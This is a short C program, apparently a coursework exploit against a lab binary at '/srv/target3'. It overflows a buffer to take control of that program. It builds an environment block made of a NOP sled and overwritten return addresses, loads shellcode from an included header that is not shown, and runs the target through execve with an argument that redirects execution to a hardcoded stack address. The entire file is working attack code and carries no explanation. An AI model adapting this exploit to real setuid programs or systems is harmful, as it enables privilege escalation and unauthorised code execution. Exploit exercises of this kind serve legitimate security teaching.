#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"
#define ENV_SIZE 400
#define BASE_ADDRESS 0xffffdec0
#define NOP_SLED_SIZE 201

void prepareEnvironment(char *env) {
    // Fill environment with NOPs
    memset(env, 0x90, ENV_SIZE - 1);

    // Adjust return addresses
    *((uint32_t *)(env)) = BASE_ADDRESS + 4;
    *((uint32_t *)(env + 4)) = BASE_ADDRESS + 8;

    // Copy shellcode to the specified position
    memcpy(env + NOP_SLED_SIZE, shellcode, sizeof(shellcode));

    // Ensure the environment is null-terminated
    env[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *args[] = {
        TARGET,
        "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff",
        NULL
    };
    static char environment[ENV_SIZE];

    prepareEnvironment(environment);

    char *env[] = {environment};

    execve(TARGET, args, env);
    fprintf(stderr, "execve failed.\n");

    return 0;
}
